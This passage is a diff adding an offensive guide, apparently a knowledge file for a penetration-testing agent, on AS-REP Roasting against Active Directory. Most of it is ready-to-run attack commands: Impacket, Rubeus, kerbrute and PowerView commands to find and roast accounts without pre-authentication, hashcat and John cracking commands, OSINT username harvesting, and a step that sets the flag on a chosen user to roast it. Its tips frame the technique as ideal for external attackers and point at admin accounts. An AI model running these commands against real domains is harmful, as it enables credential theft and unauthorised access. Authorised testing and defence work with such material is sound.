@@ -1,0 +1,186 @@
+<vulnerability_guide>
+  <title>AS-REP ROASTING - PRE-AUTHENTICATION BYPASS EXPLOITATION</title>
+
+  <critical>AS-REP Roasting targets accounts with Kerberos pre-authentication disabled (DONT_REQUIRE_PREAUTH flag). Unlike Kerberoasting, this attack does NOT require valid domain credentials - only a list of usernames. The encrypted portion of the AS-REP response can be cracked offline to recover the account password. This makes it valuable for initial access scenarios.</critical>
+
+  <scope>
+    - User accounts with "Do not require Kerberos preauthentication" enabled
+    - Legacy application accounts requiring compatibility mode
+    - Accounts misconfigured during migration or provisioning
+    - Service accounts with relaxed security settings
+    - Accounts in domains with weak password policies
+  </scope>
+
+  <methodology>
+    1. **Username enumeration**: Build list of valid domain usernames
+    2. **Identify vulnerable accounts**: Find accounts without pre-auth requirement
+    3. **Request AS-REP**: Send AS-REQ for vulnerable accounts without credentials
+    4. **Extract hashes**: Capture encrypted timestamp from AS-REP
+    5. **Offline cracking**: Crack hashes to recover plaintext passwords
+  </methodology>
+
+  <advanced_techniques>
+    <vulnerable_account_enumeration>
+      Find accounts without pre-authentication:
+      {% raw %}
+      # LDAP query for vulnerable accounts
+      (&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
+
+      # PowerView enumeration
+      Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,userprincipalname
+
+      # PowerShell native
+      Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
+
+      # Impacket - enumerate and attack
+      GetNPUsers.py -dc-ip DC_IP domain/ -usersfile users.txt -format hashcat
+
+      # Without credentials, enumerate via LDAP null bind (if allowed)
+      ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=local" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
+      {% endraw %}
+    </vulnerable_account_enumeration>
+
+    <asrep_extraction>
+      Request AS-REP without pre-authentication:
+      {% raw %}
+      # Impacket - GetNPUsers with username list
+      GetNPUsers.py domain/ -dc-ip DC_IP -usersfile users.txt -outputfile asrep.txt -format hashcat
+
+      # Impacket - single user
+      GetNPUsers.py domain/targetuser -dc-ip DC_IP -no-pass -format hashcat
+
+      # Rubeus - from domain-joined machine
+      Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+      # Rubeus - target specific user
+      Rubeus.exe asreproast /user:targetuser /format:hashcat
+
+      # kerbrute - username enumeration + AS-REP roasting
+      kerbrute userenum -d domain.local --dc DC_IP users.txt
+      {% endraw %}
+    </asrep_extraction>
+
+    <hash_cracking>
+      Crack AS-REP encrypted timestamps:
+      {% raw %}
+      # Hashcat - Kerberos 5 AS-REP (Type 23 - RC4)
+      hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule
+
+      # John the Ripper
+      john --format=krb5asrep asrep.txt --wordlist=wordlist.txt
+
+      # Hashcat with rules
+      hashcat -m 18200 asrep.txt wordlist.txt -r rules/d3ad0ne.rule -r rules/toggles5.rule
+
+      # Mask attack for common patterns
+      hashcat -m 18200 asrep.txt -a 3 ?u?l?l?l?l?l?d?d
+      {% endraw %}
+    </hash_cracking>
+
+    <username_enumeration>
+      Build username lists for unauthenticated attack:
+      {% raw %}
+      # Kerbrute - enumerate valid users via Kerberos
+      kerbrute userenum -d domain.local --dc DC_IP users.txt
+
+      # Namemash - generate usernames from names
+      namemash.py names.txt > users.txt
+
+      # Common username patterns
+      first.last
+      flast
+      firstl
+      first_last
+      f.last
+
+      # OSINT sources
+      - LinkedIn employees
+      - Email addresses from breaches
+      - GitHub commits
+      - Document metadata
+      {% endraw %}
+    </username_enumeration>
+
+    <combined_attack>
+      Chain with other techniques:
+      {% raw %}
+      # Enumerate users, then AS-REP roast
+      kerbrute userenum -d domain.local --dc DC_IP users.txt -o valid_users.txt
+      GetNPUsers.py domain/ -dc-ip DC_IP -usersfile valid_users.txt -format hashcat
+
+      # From compromised machine - find all vulnerable + request
+      Import-Module ActiveDirectory
+      Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | ForEach-Object {
+          Rubeus.exe asreproast /user:$_.SamAccountName /format:hashcat
+      }
+      {% endraw %}
+    </combined_attack>
+
+    <targeted_asrep>
+      Focus on high-value targets:
+      {% raw %}
+      # Find vulnerable privileged accounts
+      Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and AdminCount -eq 1}
+
+      # BloodHound - AS-REP roastable paths
+      MATCH (u:User {dontreqpreauth:true})-[r:MemberOf*1..]->(g:Group) WHERE g.name CONTAINS "ADMIN" RETURN u,g
+
+      # Check group memberships of vulnerable accounts
+      Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties MemberOf |
+          Select-Object SamAccountName, @{N='Groups';E={$_.MemberOf -join '; '}}
+      {% endraw %}
+    </targeted_asrep>
+
+    <set_dont_require_preauth>
+      If you have write access to userAccountControl:
+      {% raw %}
+      # Set DONT_REQUIRE_PREAUTH on target user (requires GenericWrite/GenericAll)
+      Set-ADAccountControl -Identity targetuser -DoesNotRequirePreAuth $true
+
+      # PowerView
+      Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}
+
+      # Then AS-REP roast the account
+      GetNPUsers.py domain/targetuser -dc-ip DC_IP -no-pass
+
+      # Cleanup - remove flag
+      Set-ADAccountControl -Identity targetuser -DoesNotRequirePreAuth $false
+      {% endraw %}
+    </set_dont_require_preauth>
+  </advanced_techniques>
+
+  <validation>
+    - Successfully identify accounts without pre-authentication
+    - Extract valid AS-REP hashes without domain credentials
+    - Crack at least one AS-REP hash offline
+    - Verify recovered credentials authenticate to domain
+    - Document privilege level and access gained
+  </validation>
+
+  <false_positives>
+    - Machine accounts - typically strong random passwords
+    - Accounts with very recent password changes
+    - Accounts protected by strong password policy
+    - Service accounts with managed passwords (gMSA)
+  </false_positives>
+
+  <detection_indicators>
+    - Event ID 4768 without pre-authentication data
+    - AS-REQ from external/unusual IP addresses
+    - Multiple AS-REQ for different accounts from same source
+    - AS-REQ for accounts that don't normally authenticate via Kerberos
+  </detection_indicators>
+
+  <pro_tips>
+    - AS-REP roasting works without ANY credentials - perfect for initial access
+    - Combine with username enumeration from OSINT sources
+    - Kerbrute validates usernames without credentials via Kerberos error codes
+    - Accounts with DONT_REQUIRE_PREAUTH are rare but often poorly secured
+    - If you have GenericWrite on a user, you can SET this flag temporarily
+    - RC4 hashes crack much faster than AES - check encryption type
+    - Prioritize accounts with AdminCount=1 for privilege escalation
+    - Cross-reference with password spray lockout thresholds
+  </pro_tips>
+
+  <remember>AS-REP roasting requires no authentication, making it ideal for external attackers who have enumerated valid usernames through OSINT or other means.</remember>
+</vulnerability_guide>
